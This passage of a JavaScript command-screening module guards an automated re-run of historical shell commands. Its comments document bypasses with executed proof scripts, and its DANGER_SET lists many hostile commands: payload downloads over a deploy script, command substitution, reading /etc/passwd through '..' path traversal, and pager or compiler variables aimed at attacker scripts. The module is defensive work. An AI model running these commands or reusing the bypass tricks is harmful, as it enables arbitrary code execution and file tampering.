    //     $ wc -l < /tmp/GRIP_B_MARK
    //     31
    //
    // — the attacker-named program ran 31 times, and `go test` was ADMITTED.
    //
    // So an absolute value inherits `headPathReason`'s bound EXACTLY, resolution
    // included, rather than a second hand-written one that can drift from it.
    // REACH COST, MEASURED: the corpus carries 100 `CC=` rows and every one is
    // `CC=clang` or `CC=/usr/bin/clang` — the two spellings the block above
    // names. Both still admitted; corpus reach is unchanged.
    const resolved = bare.startsWith("/") ? lexicalResolve(bare) : null;
    if (resolved !== null && !TRUSTED_BIN_DIRS.some((d) => resolved.startsWith(d))) {
      return `${name}=${value} names a PROGRAM the toolchain executes${resolved === bare ? "" : ` (it resolves to "${resolved}")`}, and it is not under ${TRUSTED_BIN_DIRS.join(", ")} — the same bound \`headPathReason\` puts on \`/tmp/evil/git\`, which is the identical capability spelled as a head`;
    }
  }
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// THE HEAD IS IDENTIFIED BY ITS BASENAME, AND A BASENAME IS NOT AN IDENTITY
// ─────────────────────────────────────────────────────────────────────────────
//
// `screenSegment` resolves the head as `argv[0].split("/").pop()`. That is
// exactly right for `/usr/bin/bash` — REFUSED_HEADS must see `bash` however it
// is spelled — and it is the whole hole in the other direction: ANY path whose
// LAST COMPONENT is an allowlisted name is admitted, whatever file is actually
// there. Executed on the authoring host:
//
//     $ cat > /tmp/gripname/git <<'X'
//     #!/bin/sh
//     id > /tmp/DOTSLASH_MARK
//     X
//     $ chmod +x /tmp/gripname/git && cd /tmp/gripname && ./git log -1
//     not git
//     $ cat /tmp/DOTSLASH_MARK
//     uid=501(pelle) gid=20(staff) …
//
// `screenCommand("./git log -1")` returns ok — gitRule reads the sub-verb `log`
// off the read allowlist and never asks what `./git` IS. Same for
// `./ls`, `./sed -n 1p`, `tooling/grip/ls`, `node_modules/.bin/curl <url>`,
// `/tmp/evil/git log` and `../../../tmp/evil/cat`. This is arbitrary code
// execution through the head allowlist, and it needs no flag, no cluster and no
// value-eating global — just a slash.
//
// IT MATTERS BECAUSE OF WHERE THE CENSUS RUNS. It re-executes historical
// commands inside a repo CHECKOUT, and harvest.mjs regenerates the corpus from
// other agents' transcripts — so both the command text and the files a relative
// path resolves against come from outside this module.
//
// THE ASYMMETRY THAT DECIDES THE FIX. For a BARE name, the screen already
// controls the one lever that redirects resolution: `PATH=` is refused by
// `envAssignmentReason`, by name, and DANGER_SET carries that row. For a
// PATH-QUALIFIED name the token itself names the file and the screen controls
// nothing. So a bare name keeps its existing bound and a path must earn one.
//
// Absolute paths under the system bin directories are admitted, because those
// are not reachable from the corpus or the checkout; a relative path, and an
// absolute path anywhere else, is refused. Under-enumerating TRUSTED_BIN_DIRS
// costs a false REFUSAL, which is the direction this module is allowed to be
// wrong in — the opposite polarity to every value-global set above, and chosen
// deliberately for that reason.
//
// REACH COST, MEASURED: 0 of the 651 frozen corpus commands use a
// path-qualified allowlisted head. The 23 slash-bearing head tokens in the
// corpus are environment prefixes (already screened), non-allowlisted binaries
// (`/tmp/bp-probe`, `bin/barkpark`) and `/usr/bin/time`, whose basename `time`
// is in REFUSED_HEADS already.
const TRUSTED_BIN_DIRS = ["/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/", "/usr/local/bin/", "/opt/homebrew/bin/"];

/**
 * @param {string} token argv[0] exactly as typed
 * @param {string} head its basename, the name every rule below is keyed on
 * @returns {string|null} why a path-qualified head is refused, or null
 */
// A `startsWith` PREFIX TEST IS NOT A CONTAINMENT TEST, and that was the whole
// fix above, defeated by two dots.
//
// The block above admits an absolute path "under the system bin directories"
// and implements it as `token.startsWith("/usr/bin/")`. `..` is an ordinary path
// component, so a token may satisfy that prefix and then walk straight back out
// of it. Executed on the authoring host, against the very script the block above
// uses to demonstrate the hole it closed:
//
//     $ cat > $B/evil/git <<'X'
//     #!/bin/sh
//     echo "PWNED-A path-traversal-git argv=$*" > /tmp/GRIP_A_MARK
//     echo "not git"
//     X
//     $ chmod +x $B/evil/git
//     $ /usr/bin/../..$B/evil/git log -1
//     not git
//     $ cat /tmp/GRIP_A_MARK
//     PWNED-A path-traversal-git argv=log -1
//
// `screenCommand("/usr/bin/../../…/evil/git log -1")` returned ok. So did
// `/bin/../tmp/evil/cat /etc/passwd` and
// `/usr/local/bin/../../../tmp/evil/curl <url>`. The refusal of `./git` and
// `/tmp/evil/git` stood the whole time — this is the SAME capability spelled
// through a directory the allowlist trusts, which is the pattern that has now
// paid four times in this file (`-o` → `-so`, `GIT_PAGER=` → `git -c
// core.pager=`, the ENV spelling → the FLAG spelling, and this).
//
// The fix RESOLVES `.` and `..` LEXICALLY — never touching the filesystem,
// because a screen must not depend on what happens to exist — and prefix-tests
// the RESOLVED path. Lexical rather than `realpath` is deliberate: `realpath`
// follows symlinks, so it would consult a mutable filesystem three live cycles
// share, and a token that resolves differently between the screen and the exec
// is worse than either answer alone.
//
// Interior `//` is NOT collapsed, so `//usr/bin/git` stays REFUSED. POSIX leaves
// a leading `//` implementation-defined, so collapsing it would be a WIDENING
// justified by a guess — the wrong direction for this layer.

/**
 * Resolve `.` and `..` in a path token lexically. No filesystem access, no
 * symlink resolution. A leading `..` that cannot be popped is PRESERVED, which
 * keeps the token relative and therefore refused by the caller.
 *
 * @param {string} token
 * @returns {string} the resolved token
 */
export function lexicalResolve(token) {
  const s = String(token ?? "");
  const absolute = s.startsWith("/");
  const out = [];
  for (const part of s.split("/")) {
    if (part === ".") continue;
    if (part === "..") {
      const last = out[out.length - 1];
      // Pop only a real name. At the root of an absolute path `..` IS the root
      // and is dropped; in a relative path it must be PRESERVED, or
      // `../../tmp/evil/git` would resolve to `tmp/evil/git` — still refused,
      // but for a reason that no longer describes the token.
      if (out.length && last !== ".." && last !== "") out.pop();
      else if (!absolute) out.push("..");
      continue;
    }
    out.push(part);
  }
  const joined = out.join("/");
  return absolute && !joined.startsWith("/") ? `/${joined}` : joined;
}

/**
 * @param {string} token argv[0] exactly as typed
 * @param {string} head its basename, the name every rule below is keyed on
 * @returns {string|null} why a path-qualified head is refused, or null
 */
export function headPathReason(token, head) {
  if (!token.includes("/")) return null;
  // A refused head stays refused by NAME however it is spelled; saying so here
  // keeps `/bin/bash` reading as "bash runs a script" rather than as a path
  // complaint, which is the more useful diagnosis.
  if (REFUSED_HEADS.has(head)) return null;
  const resolved = lexicalResolve(token);
  // The RESOLVED path must still name the same program. `/usr/bin/git/..`
  // resolves to `/usr/bin`, whose basename is `bin`, not `git` — a token whose
  // program name changes under resolution is one the screen cannot bound.
  if (resolved.split("/").pop() !== head) {
    return `"${token}" resolves to "${resolved}", which does not name the program "${head}" — a head whose program name changes under \`.\`/\`..\` resolution cannot be bounded`;
  }
  if (TRUSTED_BIN_DIRS.some((d) => resolved.startsWith(d))) return null;
  const via = resolved === token ? "" : ` (it resolves to "${resolved}", which is not under a trusted bin directory)`;
  return `"${token}" names a FILE, not the program "${head}"${via} — a head is identified by its basename, so any path ending in an allowlisted name is admitted whatever is actually there (\`./git log\` and \`/usr/bin/../../tmp/evil/git log\` each ran an arbitrary script on the authoring host). Use the bare name, or an absolute path under ${TRUSTED_BIN_DIRS.join(", ")}`;
}

/** Screen ONE pipeline segment. @returns {string|null} refusal reason or null */
export function screenSegment(segment) {
  let s = String(segment ?? "").trim();
  if (!s) return "empty segment";

  // `MIX_ENV=test mix test …` — the assignment is a prefix, not the command.
  // Stripping is what makes `MIX_ENV=test mix ecto.drop` reach the mix rule
  // rather than sail past a head check that saw `MIX_ENV=test`. Every prefix is
  // SCREENED before it is stripped; see the block above.
  let m;
  while ((m = s.match(ENV_ASSIGNMENT))) {
    const why = envAssignmentReason(m[1], m[2]);
    if (why) return `not allowlisted: ${why}`;
    s = s.slice(m[0].length).trim();
    if (!s) return "not allowlisted: a bare environment assignment is not a command";
  }

  const argv = tokenize(s);
  if (!argv.length) return "not allowlisted: empty segment";

  const head = argv[0].split("/").pop();
  const path = headPathReason(argv[0], head);
  if (path) return `not allowlisted: ${path}`;
  const refused = REFUSED_HEADS.get(head);
  if (refused) return `not allowlisted: ${refused}`;

  const rule = ALLOWED_HEADS.get(head);
  if (!rule) return `not allowlisted: unknown command head "${head}" — the screen fails CLOSED`;

  const why = rule.check(argv);
  return why ? `not allowlisted: ${why}` : null;
}

// ─────────────────────────────────────────────────────────────────────────────
// (c) WRITE SHAPES — SECOND-LAYER DEFENCE, never the gate
// ─────────────────────────────────────────────────────────────────────────────
//
// Layer (b) already refuses every head below, so in a correct screen this layer
// is unreachable. That is the point: it exists to catch a MISTAKE in the
// allowlist — a head added carelessly, a sub-verb guard with a hole. It is
// tested directly (see screen.test.mjs) rather than through screenCommand, so
// "unreachable" never quietly becomes "untested".
//
// It also fixes the gap this slice was filed against: rerun.mjs's WRITE_SHAPES
// filesystem rule is `(mkdir|touch|chmod|chown|ln)` — `cp` appears NOWHERE in
// that module, and `cp /tmp/evil.js api/lib/barkpark/application.ex` is exactly
// the command that overwrites a live source file with different content.

// A backstop entry may be a REGEX or a PREDICATE over the scanned string. The
// three text tools need a predicate: `uniq in.txt out.txt` is a write with no
// flag in it at all — the write is spelled as an ordinary filename in the second
// positional — and no honest regex separates that from `uniq -f 2 in.txt`.
//
// THE BACKSTOP SHARES THE LAYER-(b) PREDICATE ON PURPOSE, and that bounds what
// it defends against. It catches the mistake this hole actually was: a head
// re-registered as `plainRule()`, or dropped from ALLOWED_HEADS and re-added
// carelessly. It does NOT independently re-derive the judgement, so a bug INSIDE
// `outputFlagRule`/`uniqRule` fails both layers at once. Hand-copying the
// grammar into a second regex would buy that one case and cost the drift this
// epic exists to abolish (five hand-copies of one grammar is its named defect
// class). The mutation proof in screen.test.mjs exercises exactly the case this
// layer does cover.
const headWritesFile = (head, rule) => (scanned) =>
  String(scanned)
    .split(/[|;&\n]+/)
    .map((seg) => tokenize(seg.trim()))
    .some((argv) => argv.length > 0 && argv[0].split("/").pop() === head && rule.check(argv) !== null);

export const WRITE_SHAPES = [
  [/\bcp\s/, "cp (overwrites a file with different content — absent from rerun.mjs's WRITE_SHAPES)"],
  [headWritesFile("sort", outputFlagRule("sort", SORT_VALUE_LETTERS)), "sort -o/--output writes a file"],
  [headWritesFile("tree", outputFlagRule("tree", TREE_VALUE_LETTERS)), "tree -o/--output writes a file"],
  [headWritesFile("uniq", uniqRule), "uniq's second positional is an output file"],
  [/\b(rm|mv|dd|trash|shred|truncate|install)\s/, "destructive filesystem verb"],
  [/\b(mkdir|touch|chmod|chown|chgrp|ln)\s/, "filesystem mutation"],
  [/\btee\b/, "tee"],
  [/\bsed\s+-[a-z]*i\b/, "sed -i"],
  [/\bgit\s+(push|commit|checkout|switch|reset|rebase|merge|clean|apply|am|fetch|pull|cherry-pick|restore|worktree\s+(add|remove|prune))\b/, "git write verb"],
  [/\bmix\s+(ecto\.(drop|create|migrate|rollback|reset)|deps\.get|release|run)\b/, "mix write task"],
  [/\b(npm|pnpm|yarn)\s+(publish|install|add|remove|link|unlink)\b/, "package mutation"],
  [/\bsystemctl\s+(start|stop|restart|reload|enable|disable|mask|unmask|kill|daemon-reload)\b/, "systemctl mutating verb"],
  [/\b(reboot|shutdown|halt|poweroff)\b/, "machine power state"],
  [/\bkill\s+-(9|15|TERM|KILL)\b/, "kill with a terminating signal"],
  [/\b(pkill|killall)\b/, "signal by pattern or name"],
  [/\bcurl\b[^|]*\s-X\s*(POST|PUT|PATCH|DELETE)/i, "curl write method"],
  [/\bcurl\b[^|]*\s(-d|--data|--data-raw|--data-binary|-F|--form|-T|--upload-file)\b/, "curl request body"],
  // `-o` may sit at the end of a short-flag CLUSTER (`-so out`), which the
  // bare ` -o ` form misses — the same gap that let the clustered form through
  // layer (b). `-O`/`-J` name the file themselves and take no argument.
  [/\bcurl\b[^|]*\s-[A-Za-z]*o\s+(?!\/dev\/null\b)\S/, "curl -o writes a file"],
  [/\bcurl\b[^|]*\s-[A-Za-z]*[OJ](\s|$)/, "curl -O/-J writes a file it names itself"],
  [/\bgh\s+(repo\s+clone|release\s+download|run\s+download|gist\s+clone)\b/, "gh write verb (clones or downloads to disk)"],
  [/\bbp\s+[\w-]+\s+(create|publish|patch|delete|close|claim|stamp|pulse|set)\b/, "bp write verb"],
  [/\b(DROP|DELETE|INSERT|UPDATE|TRUNCATE|ALTER|CREATE)\s+(TABLE|INTO|FROM|DATABASE|INDEX|SET)\b/i, "SQL write"],
  [/--write\b/, "--write"],
  [/--fix\b/, "--fix"],
  [/--in-place\b/, "--in-place"],
  // ── wave 5. The four heads whose rule MISSED a write flag get the same
  // shared-predicate backstop as the three text tools above, and inherit the
  // same stated bound: this catches a head dropped from ALLOWED_HEADS or
  // re-registered as `plainRule()`, not a bug INSIDE the rule.
  //
  // They sit LAST on purpose. Firing on `rule.check(argv) !== null` means these
  // fire on ANY refusal the rule can produce, not only a write — so a more
  // specific entry above (`git write verb`, `mix write task`, `package
  // mutation`) must win the reason, and the label here is worded to stay honest
  // for whatever is left.
  [headWritesFile("go", goRule), "the go rule refuses this segment (a -c/-o/-exec/-*profile write flag, or a non-read sub-verb)"],
  [headWritesFile("npm", npmRule), "the npm rule refuses this segment (`npm config set` / `npm version <bump>`, or a non-read sub-verb)"],
  [headWritesFile("mix", mixRule), "the mix rule refuses this segment (`--cover`/`--export-coverage`, or a task other than `test`)"],
  [headWritesFile("sed", sedRule), "the sed rule refuses this segment (`-i`, a `w` script command, `s///w`, or an unparsable script)"],
];

/**
 * @param {string} scanned  a MASKED command (quoted spans neutralised)
 * @returns {string|null}
 */
export function writeShapeReason(scanned) {
  const s = String(scanned ?? "");
  for (const [matcher, why] of WRITE_SHAPES) {
    if (typeof matcher === "function" ? matcher(s) : matcher.test(s)) return why;
  }
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// THE SCREEN
// ─────────────────────────────────────────────────────────────────────────────

const refuse = (reason) => ({ ok: false, reason });

/**
 * Screen a historical command for re-execution by the census.
 *
 * @param {string} cmd
 * @returns {{ok: boolean, reason: string}}
 */
export function screenCommand(cmd) {
  const raw = String(cmd ?? "").trim();
  if (!raw) return refuse("empty command");

  // QUOTE MASKING, and the guard that makes it SOUND. Every layer below reads
  // the masked string, so masking must not be able to hide a command: a
  // double-quoted span sh would EXPAND is refused here, before anything trusts a
  // blanked span. Wave 5 shipped this after `grep -n "$(id > /tmp/DQ_MARK)" .`
  // ran through `censusOne` and wrote the marker.
  const expands = doubleQuoteExpansionReason(raw);
  if (expands) return refuse(`shell metacharacter: ${expands}`);

  const masked = maskQuotedSpans(raw);
  if (masked === null) return refuse("unparsable: unterminated quote — a command the screen cannot parse is a command it cannot bound");

  // (a) HOST BOUND — first of the substantive layers, over the MASKED string so
  // a hostname QUOTED AS DATA is data. Sound only because of the guard above.
  const host = hostBoundReason(masked);
  if (host) return refuse(`host bound: ${host}`);

  // (b) METACHARACTERS, then the ALLOWLIST over every pipeline segment.
  const meta = metacharacterReason(masked);
  if (meta) return refuse(`shell metacharacter: ${meta}`);

  const segments = splitSegments(raw, masked);
  if (!segments.length) return refuse("not allowlisted: no command found");
  for (const seg of segments) {
    const why = screenSegment(seg);
    if (why) return refuse(segments.length > 1 ? `${why} (in pipeline segment \`${seg}\`)` : why);
  }

  // (c) WRITE SHAPES — second layer, over the quote-masked command.
  const write = writeShapeReason(masked);
  if (write) return refuse(`write shape: ${write}`);

  return { ok: true, reason: "admitted: within the host bound, allowlisted head and sub-verb, no write shape" };
}

/**
 * Screen a list of commands and report the ADMISSION RATE — the census's
 * honest reach.
 *
 * The rate is a property of THIS command set and may never be restated as
 * coverage of anything else. A statistic derived over the admitted subset
 * describes that subset, not the corpus it was drawn from.
 */
export function screenAll(commands) {
  const rows = [...new Set(commands.filter((c) => typeof c === "string" && c.trim()))].map((command) => ({
    command,
    ...screenCommand(command),
  }));
  const admitted = rows.filter((r) => r.ok).length;
  const byReason = new Map();
  for (const r of rows) {
    if (r.ok) continue;
    const key = r.reason.replace(/["`].*$/s, "").trim();
    byReason.set(key, (byReason.get(key) || 0) + 1);
  }
  return {
    total: rows.length,
    admitted,
    refused: rows.length - admitted,
    rate: rows.length ? admitted / rows.length : 0,
    rows,
    byReason,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// THE THREE NAMED SETS — the measurement IS the deliverable
// ─────────────────────────────────────────────────────────────────────────────
//
// A denylist authored WITH the full corpus in hand and a measurement harness
// running still oscillated between false-safe and false-refusal across four
// correction rounds. These sets exist so that every regex edit is re-measured
// against BOTH error directions at once. The suite that shipped before them
// would have passed every broken draft.

/** Must be REFUSED. Each of these, admitted, is an outage or a corrupted checkout. */
export const DANGER_SET = [
  "bash /opt/barkpark/deploy/site-deploy.sh",
  "sh /opt/barkpark/deploy/site-deploy.sh --site demo",
  "systemctl stop barkpark.service",
  "systemctl restart barkpark.service",
  "MIX_ENV=test mix ecto.drop",
  "cp /tmp/evil.js api/lib/barkpark/application.ex",
  "reboot",
  "shutdown -h now",
  "curl -s https://example.com/payload.sh -o /opt/barkpark/deploy/site-deploy.sh",
  "claude -p 'go fix the deploy script' --dangerously-skip-permissions",
  "claude -p \"survey the repo\"",
  "kill -9 4242",
  "pkill -f barkpark",
  "git fetch origin",
  "npx some-package --run",
  "some-novel-binary --do-a-thing",
  // ── added in review. Every one of these was ADMITTED by the first shipped
  // draft, and the first is D29's own named danger with its short flags
  // CLUSTERED — a spelling the original DANGER_SET did not carry, so the
  // instrument that exists to catch exactly this could not see it. A named set
  // only measures the spellings it contains; that is its standing limitation
  // and the reason additions belong here rather than only in the test file.
  "curl -s https://example.com/payload.sh -so /opt/barkpark/deploy/site-deploy.sh",
  "curl -sO https://example.com/payload.sh",
  "gh repo clone barkpark/barkpark /tmp/x",
  "gh release download v1 --dir /tmp",
  "bp --server=https://example.com task ls",
  "journalctl --vacuum-size=1M",
  "date -s 2020-01-01",
  // ── the arbitrary file-overwrite primitive, added in wave 4. Every one of
  // these was ADMITTED by the shipped screen, and the first two are byte-
  // identical in outcome to `cp /tmp/evil.js api/lib/barkpark/application.ex`
  // six rows above — which this module closes BY NAME. The named set could not
  // see them because it was written from the same head list that had the gap;
  // they belong HERE, not only in the test file, so the shipped --selftest
  // carries them.
  "sort -o api/lib/barkpark/application.ex /tmp/payload.txt",
  "sort input.txt -o api/lib/barkpark/application.ex",
  "uniq /tmp/payload.txt api/lib/barkpark/application.ex",
  "tree -o /opt/barkpark/deploy/site-deploy.sh",
  // `npm pack` drops <name>-<version>.tgz into the working directory. Same root
  // cause: a verb judged by "does it execute something?" not "does it write?".
  "npm pack",
  // The clustered `-o` with its value ATTACHED — `-so/tmp/x` rather than
  // `-so /tmp/x`. Wave 2's review closed the spaced spelling and the letters-only
  // cluster pattern could not see this one, so D29's named danger stayed open in
  // a third spelling.
  "curl -s https://example.com/payload.sh -so/opt/barkpark/deploy/site-deploy.sh",
  // ── wave 5. THE TWO UPSTREAM PRIMITIVES. Both were admitted by the shipped
  // screen and both were live-proven to EXECUTE: the first through `censusOne`
  // itself, which returned screened:true/executed:true and wrote /tmp/DQ_MARK
  // carrying real `id` output. They sit ABOVE and BELOW the head allowlist
  // respectively, which is why no head-rule tightening in four waves reached
  // either of them.
  'grep -n "$(id > /tmp/DQ_MARK)" .',
  'grep -n "`id > /tmp/DQ_MARK`" .',
  "GIT_EXTERNAL_DIFF=./evil.sh git diff HEAD~1",
  "GIT_PAGER=./evil.sh git log -1",
  "PAGER=./evil.sh gh pr view 1",
  "NODE_OPTIONS=--require=./evil.cjs node --test ok.test.mjs",
  "PATH=/tmp/evil:$PATH git log -1",
  "CC=./evil.sh go test ./...",
  // ── wave 5. The four write-flag holes: heads that HAVE a rule which missed a
  // flag. Zero corpus reach at today's volume; the fix matters once the ledger
  // stores commands faster than anyone reads them.
  "git log --output=/tmp/evil.txt",
  "git log --output /tmp/evil.txt",
  "npm config set registry http://evil",
  "npm version patch",
  "mix test --cover",
  "mix test --export-coverage=/tmp/evil",
  "go test -c",
  "go test -coverprofile=/tmp/evil.out ./...",
  "go test -cpuprofile=/tmp/evil.out ./...",
  "go env -w GOFLAGS=-mod=mod",
  "hostname evil-name",
  // ── wave 5. sed is ADMITTED for reads now, so its write forms are named here.
  "sed -i 's/a/b/' api/lib/barkpark/application.ex",
  "sed -i.bak 's/a/b/' api/lib/barkpark/application.ex",
  "sed -n 'w /opt/barkpark/deploy/site-deploy.sh' notes.md",
  "sed 's/x/y/w /opt/barkpark/deploy/site-deploy.sh' notes.md",
  "sed -f /tmp/evil.sed notes.md",
  // ── the value-eating-global collision, heads 2 and 3. #13346 fixed this
  // shape for docker/pnpm and named systemctl and gh as untouched scope. Both
  // were ADMITTED by the shipped screen: `-H`'s eaten value `status` collides
  // with systemctl's own allowlisted read verb, and `-R`'s eaten value
  // `status` collides with gh's read noun `status` (which needs no sub-verb),
  // so in both cases the real verb/noun+subverb pair after the eaten value was
  // never examined.
  "systemctl -H status restart barkpark.service",
  "systemctl --host status restart barkpark.service",
  "systemctl --root status restart barkpark.service",
  "gh -R status repo clone owner/repo /tmp/evil",
  "gh --repo status repo clone owner/repo /tmp/evil",
  "gh -R status release download owner/repo",
  // A FOURTH wave over the same enumeration. Each of these was ADMITTED after
  // the three fixes above shipped — `-c` is the short spelling of a `--context`
  // already named, `--dir` is the primary spelling of a `-C` already named, and
  // clusters walked past exact-token comparison entirely. The docker and pnpm
  // and npm rows were EXECUTED live with a harmless verb in the dangerous slot
  // (`docker --tlscacert ps version` printed version output); the systemctl rows
  // are documented required-argument globals, systemd being Linux-only.
  "docker -c ps exec -it foo bash",
  "docker -l ps exec -it foo bash",
  "docker --log-level ps exec -it foo bash",
  "docker --tlscacert ps exec -it foo bash",
  "docker --tlscert ps run --privileged alpine sh",
  "docker -Dc ps exec -it foo bash",
  "pnpm --dir ls add lodash",
  "pnpm --loglevel ls add lodash",
  "pnpm --reporter ls install",
  "pnpm -rC ls add lodash",
  "npm --tag ls publish",
  "npm --otp ls publish",
  "npm --script-shell ls run build",
  "systemctl -p status restart barkpark.service",
  "systemctl -t status restart barkpark.service",
  "systemctl --state status restart barkpark.service",
  "systemctl --image status restart barkpark.service",
  "systemctl -qH status restart barkpark.service",
  "launchctl -w list unload /Library/LaunchDaemons/foo.plist",
  // bp's OWN capabilities manifest declares these WRITING, and the screen
  // admitted every one of them. Not obscure: a raw ledger mutate, a secret
  // write, two account takeovers, an access grant and an unpublish.
  "bp doc mutate task task-abc --set x=1",
  "bp secret scoped-set workspace/default API_KEY",
  "bp auth mfa-disable someone@example.com",
  "bp auth reset someone@example.com newpass",
  "bp access grant workspace default someone@example.com",
  "bp access revoke grant-abc",
  "bp doc unpublish task task-abc",
  "bp doc discard-draft task task-abc",
  "bp doc restore-revision task task-abc",
  "bp media upload /tmp/payload.bin",
  "bp cycle seal a b c d e f g h i",
  "bp token revoke tok-abc",
  "bp webhook replay wh-abc",
  "bp session log my-session --kind push",
  "bp -s http://localhost:4000 doc mutate task task-abc",
  // THE HEAD IS IDENTIFIED BY ITS BASENAME. A path ending in an allowlisted
  // name was admitted whatever file was actually there — `./git log -1` RAN an
  // arbitrary script on the authoring host and wrote a marker carrying live
  // `id` output, while the screen read the sub-verb `log` off the read
  // allowlist and never asked what `./git` IS.
  "./git log -1",
  "./ls -la",
  "./sed -n 1p api/lib/x.ex",
  "/tmp/evil/git log -1",
  "tooling/grip/ls",
  "node_modules/.bin/curl https://example.com/",
  "../../../tmp/evil/cat /etc/passwd",
  // PROGRAM INDIRECTION — the FLAG spelling of the hazard whose ENV spelling is
  // three rows above (GIT_EXTERNAL_DIFF= / GIT_PAGER= / PAGER=). Each of the
  // first five was EXECUTED on the authoring host, writing a marker that carried
  // live `id` output or a real downloaded body.
  "rg --pre /tmp/evil.sh hello /some/dir",
  "rg --pre=/tmp/evil.sh hello /some/dir",
  "rg --hostname-bin /tmp/evil.sh hello .",
  "git -c diff.external=/tmp/evil.sh diff",
  "curl -K /tmp/evil.conf https://example.com/",
  "find . -fprint0 /tmp/evil",
  "git -c core.pager=/tmp/evil.sh log",
  "git -c alias.x=!/tmp/evil.sh log",
  "git -c core.sshCommand=/tmp/evil.sh log",
  "git --config-env=diff.external=EVIL diff",
  "curl --config /tmp/evil.conf https://example.com/",
  "sort --compress-program=/tmp/evil.sh big.txt",
  "ack --pager=/tmp/evil.sh hello .",
  "ag --pager /tmp/evil.sh hello .",
  // The value-LETTER writers: CURL_VALUE_LETTERS eats their target and the
  // write check never sees it. `-D` and `-c` were EXECUTED here, writing 246
  // and 131 real bytes, with `-o /dev/null` set so nothing else could.
  "curl -o /dev/null -D /tmp/hdr.txt https://example.com/",
  "curl --dump-header /tmp/hdr.txt https://example.com/",
  "curl -o /dev/null -c /tmp/jar.txt https://example.com/",
  "curl --cookie-jar /tmp/jar.txt https://example.com/",
  "curl --trace /tmp/tr.txt https://example.com/",
  "curl --trace-ascii /tmp/tr.txt https://example.com/",
  "curl --stderr /tmp/err.txt https://example.com/",
  "curl --etag-save /tmp/etag https://example.com/",
  "curl -sSD /tmp/hdr.txt https://example.com/",
  "journalctl --update-catalog",
  // ── tgw12-s2. SIX MORE BYPASSES, EACH EXECUTED OR WRITTEN ON THE AUTHORING
  // HOST WHILE THE SHIPPED SCREEN RETURNED ok. They live here, not only in the
  // test file, because DANGER_SET is what the selftest and the rerun.mjs
  // comparison both measure against — a bypass named only in a test is a bypass
  // the MEASUREMENT cannot see, which is the standing limitation the block
  // above already states. Every one is the same pattern: a capability this
  // screen ALREADY REFUSES, reachable by a SECOND SPELLING.
  //
  // (The first draft of this addition landed in REGRESSION_SET by mistake —
  // both lists end on `];` and the neighbouring rows read alike. The selftest
  // reported all ten as FALSE REFUSALS immediately, which is the named sets
  // doing precisely the job the block above describes: measuring BOTH error
  // directions so a wrong edit cannot pass as a right one.)
  //
  // 1. the trusted-bin PREFIX test is not a CONTAINMENT test — `..` walks out
  "/usr/bin/../../tmp/evil/git log -1",
  "/bin/../tmp/evil/cat /etc/passwd",
  // 2. the ENV twin of that same bound: an absolute CC anywhere on the disk,
  //    executed 31 times by cgo under an ADMITTED `go test`
  "CC=/tmp/evil.sh go test ./...",
  // 3. `-exec` was refused and its two siblings that also run a binary were not
  "go test -toolexec=/tmp/evil ./...",
  "go vet -vettool=/tmp/evil ./...",
  // 4. three curl write targets with no SHORT letter, so the letter-derived
  //    sweep that closed `-D`/`-c` could not see them
  "curl -s -o /dev/null --libcurl /tmp/evil.c https://example.com/",
  "curl -s --remote-name-all https://example.com/index.html",
  "curl -s -o /dev/null -w %output{/tmp/evil}PWNED https://example.com/",
  // 5. `-c` got a fourteen-key allowlist; `--git-dir=` hands git a WHOLE CONFIG
  //    FILE, and core.fsmonitor ran under an allowlisted `git status`
  "git --git-dir=/tmp/evil/.git --work-tree=/tmp/evil status --short",
  // 6. the `--pager` sweep was organised by HEAD, and git's own grep has the flag
  "git grep -O/tmp/evil.sh -l pattern",
];

/** Must stay ADMITTED. Refusing these is the gate punishing honest work. */
export const REGRESSION_SET = [
  "grep -n 'template' deploy/site-deploy.sh",
  "mix test test/barkpark/sites/deploy_runner_test.exs:583",
  "git worktree list",
  "command -v setsid",
];

/** Must stay ADMITTED. These LOOK dangerous and are not — the cry-wolf trap. */
export const NEVER_CRY_WOLF_SET = [
  "kill -0 4242",
  "curl -s -o /dev/null -w %{http_code} https://x/",
  "systemctl is-active barkpark.service",
  "docker ps",
  // The write guards added in wave 4 target the FLAG, never the tool. If any of
  // these ever refuses, the guard has started crying wolf on ordinary text work.
  "sort /tmp/lines.txt",
  "sort -u -k2,2 /tmp/lines.txt",
  "uniq -c /tmp/lines.txt",
  "uniq -f 2 /tmp/lines.txt",
  "tree docs/",
  "tree -L 2 -I node_modules docs/",
  // ── wave 5. THE WIDENINGS. Each of these was REFUSED by the shipped screen
  // and each is an honest read, so each belongs in the cry-wolf set rather than
  // only in the test file: if one of them ever refuses again, the screen has
  // resumed the behaviour that gets it routed around.
  //
  // A pattern is not a target — the ops docs this wave reads are full of `ssh`.
  'cd /x && grep -c "ssh" docs/ops/PROD_OPS.md',
  "grep -rn 'rsync' docs/ops/",
  // The line citation the rerun harness's own schema tells producers to write.
  "git show origin/main:api/lib/barkpark/application.ex | sed -n '40,60p'",
  "sed -n '866,870p' .claude/workflows/bp-connectors-charter.md",
  "sed -n '18p' docs/cards/studio.md",
  "sed -n '/type ChatWorkflowSummary struct/,/^}/p' internal/apiclient/chat.go",
  "sed -n '82p;98p;130p' api/test/barkpark/search/strength_ranking_test.exs",
  "sed 's/foo/bar/g' notes.md",
  "sed -e '1,5p' -e '9q' notes.md",
  // Single quotes are genuinely inert — refusing these would be the wrong fix
  // for the double-quote hole.
  "grep -n '$(id)' .",
  "grep -n 'x`y`z' .",
  // The write-flag guards target the FLAG, never the tool.
  "npm version",
  "npm config get registry",
  "go test -cover ./...",
  "go test ./internal/cli/... -run TestFoo -count=1 -v",
  "mix test test/barkpark/sites/deploy_runner_test.exs:583",
  "hostname",
  "hostname -f",
  "CC=/usr/bin/clang MIX_ENV=test mix test --seed 111",
  // The value-eating-global fix must not refuse the HONEST use of the global
  // it now normalises — `-H`/`-R` pointed at a real host/repo, followed by a
  // real allowlisted read verb/noun+subverb.
  "systemctl -H example.com status barkpark.service",
  "gh -R owner/repo pr view 1",
  "gh --repo owner/repo issue list",
  // …and the mirror for the fourth wave: the newly-normalised globals pointed at
  // a REAL value, followed by a real read verb, must all stay admitted. The
  // backstop must not fire on a read whose arguments merely LOOK flag-shaped.
  "docker -D ps",
  "docker -c myctx ps",
  "docker --log-level debug images",
  "docker --tlscacert /home/me/ca.pem version",
  "pnpm --dir /some/dir ls",
  "pnpm --filter @barkpark/core list",
  "pnpm --loglevel silent outdated",
  "npm --tag latest view express",
